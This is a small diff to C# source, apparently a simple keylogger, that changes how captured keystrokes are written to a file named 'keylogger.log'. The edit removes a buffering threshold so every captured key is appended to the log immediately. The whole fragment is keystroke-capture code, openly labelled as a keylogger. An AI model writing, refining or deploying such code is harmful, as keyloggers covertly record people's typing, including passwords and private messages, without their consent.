@@ -29,11 +29,8 @@ namespace key1
                     if (state != 0)
                     {
                         buf += ((Keys)i).ToString();
-                        if (buf.Length > 10)
-                        {
-                            System.IO.File.AppendAllText("keylogger.log", buf);
-                            buf = "";
-                        }
+                        System.IO.File.AppendAllText("keylogger.log", buf);
+                        buf = "";
                     }
                 }
             }
